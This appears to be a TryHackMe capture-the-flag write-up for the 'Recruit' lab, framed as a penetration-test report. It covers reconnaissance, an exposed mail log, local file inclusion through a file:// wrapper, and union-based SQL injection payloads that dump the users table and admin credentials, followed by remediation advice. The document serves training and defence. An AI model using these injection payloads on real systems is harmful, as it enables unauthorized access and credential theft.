# TryHackMe: Recruit — Penetration Testing Write-up

## Executive Summary
During a penetration testing engagement against the **Recruit** web application, multiple vulnerabilities were identified—including sensitive file exposure, Local File Inclusion (LFI), and SQL Injection (SQLi). These flaws enabled full database enumeration and administrative credential harvest, leading to complete compromise of the candidate management portal.

---

## 1. Initial Reconnaissance & Scanning 

An initial Nmap scan was conducted against the target IP (`10.129.129.86`) to identify running services.
`nmap 10.129.129.86`

<img width="652" height="423" alt="Screenshot 2026-10-21 at 11 52 36" src="https://github.com/user-attachments/assets/37c5f18c-0795-47dc-804f-1f71d8754079" />


Findings:
Port 22/tcp: SSH

Port 53/tcp: Domain (DNS)

Port 80/tcp: HTTP (Apache Web Server)

## 2. Web Application Enumeration & Information Disclosure
Navigating to the web application on port 80 revealed a login portal

<img width="1432" height="496" alt="Screenshot 2026-10-21 at 11 53 10" src="https://github.com/user-attachments/assets/73c52a23-28fe-46f0-9f8b-f3f3861992ee" />

Uncovered Sensitive Mail Logs
Directory enumeration using `gobuster` led to an open directory at /mail/ containing mail.log.

<img width="1121" height="411" alt="Screenshot 2026-10-21 at 12 07 33" src="https://github.com/user-attachments/assets/e0768b31-ab6c-4f23-abd4-121a23fa534b" />

<img width="1095" height="687" alt="Screenshot 2026-10-21 at 12 07 45" src="https://github.com/user-attachments/assets/d258ee40-7e63-46ec-b3e9-3cce5d80676c" />

Key Log Findings:
HR Credentials Note: Credentials for the hr user were hardcoded in the config.php application file.

Architecture Note: Administrator credentials were confirmed to be stored separately within the backend database.


3. Local File Inclusion (LFI) & HR Account Compromise
A file viewer endpoint (/file.php?cv=file://...) was identified as vulnerable to LFI, allowing arbitrary local file reads.

Using the wrapper file://config.php, the backend configuration file was read directly:

<img width="1353" height="717" alt="IMG_0250" src="https://github.com/user-attachments/assets/434a786b-b5fa-494b-907c-4c69cd59dd32" />


<img width="1394" height="588" alt="Screenshot 2026-10-21 at 12 11 33" src="https://github.com/user-attachments/assets/362ebea3-e254-4a0e-98a4-05767f598e34" />


Recovered HR Credentials:
Username: hr

Password: hrpassword123

Logging into the application with these credentials granted access to the Candidate Applications HR dashboard (dashboard.php) and yielded the HR Flag:

<img width="1438" height="667" alt="Screenshot 2026-10-21 at 12 12 43" src="https://github.com/user-attachments/assets/030ef372-54a3-4cef-bfe7-ee3c1dc84711" />
you arrive at the first flag here

4. SQL Injection (Union-Based) Exploitation
The search input field on the HR Dashboard (/dashboard.php?search=) was tested for SQL injection vulnerabilities.

Syntax Analysis & Error Fingerprinting
Injecting a single quote (') triggered an explicit MySQL syntax error, confirming vulnerability to SQLi.

<img width="1440" height="619" alt="Screenshot 2026-10-21 at 12 15 07" src="https://github.com/user-attachments/assets/d4040e43-132a-4671-aff2-9051f0112016" />


Column Determination & Reflected Output
Testing column counts confirmed 4 columns in the original query layout.

`SQL`
1' UNION SELECT 1,2,3,4#
The application reflected 1, 2, 3, and 4 across the table row, establishing the injection vector.

<img width="1440" height="674" alt="Screenshot 2026-10-21 at 12 22 04" src="https://github.com/user-attachments/assets/a3aace1d-a5ee-4796-96c6-74c9c1041d7b" />



5. Database Schema & Data Enumeration
Database Name
`SQL`
1' UNION SELECT 1,2,3,database()#
Database Name: recruit_db

<img width="1440" height="570" alt="Screenshot 2026-10-21 at 12 22 45" src="https://github.com/user-attachments/assets/dbd614f1-56dc-46e4-b326-28c17ac433e3" />


Table Enumeration
`SQL`
1' UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()#
Discovered Tables: candidates, users
<img width="1440" height="671" alt="Screenshot 2026-10-21 at 12 24 39" src="https://github.com/user-attachments/assets/1554ab99-8d74-4a84-9f26-fd3c2fccc0cf" />

Column Enumeration (users Table)
`SQL`
1' UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_name='users'#
Discovered Columns: id, username, password

<img width="1434" height="664" alt="Screenshot 2026-10-21 at 12 26 22" src="https://github.com/user-attachments/assets/5509f291-c947-42dd-b284-4db28fdf7e4e" />

6. Credential Harvesting & Admin Account Takeover
Data Extraction
Using group_concat() combined with a hex colon separator (0x3a), the administrative credentials were extracted:

`SQL`
1' UNION SELECT 1, group_concat(username, 0x3a, password), 3, 4 FROM users#
Recovered Administrator Credentials:
Username: admin

Password: admin@001admin

<img width="1439" height="596" alt="Screenshot 2026-10-21 at 12 27 50" src="https://github.com/user-attachments/assets/1270170d-2632-4f23-a435-71b642c79d52" />

7. Privilege Escalation & Admin Flag Retrieval
Authenticating into the portal using the extracted admin:admin@001admin credentials granted administrative controls (Approve/Reject candidates) and displayed the final flag.
<img width="1440" height="800" alt="Screenshot 2026-10-21 at 12 28 52" src="https://github.com/user-attachments/assets/0106351c-ccec-4bd4-8840-9409acf22efa" />



Remediation Summary
Parameterize Database Queries: Refactor search functions to use prepared statements (PDO or MySQLi parameterized queries) to eliminate SQL injection vectors completely.

Remove Hardcoded Credentials: Store credentials strictly in secure environment variables rather than static source files (config.php).

Disable Directory Listing & Protect Log Files: Restrict access to sensitive directories like /mail/ and move diagnostic log files out of the web root (www / public_html).

Restrict File Access (LFI): Enforce strict input whitelisting on file paths to prevent arbitrary local file inclusion via wrapper protocols.
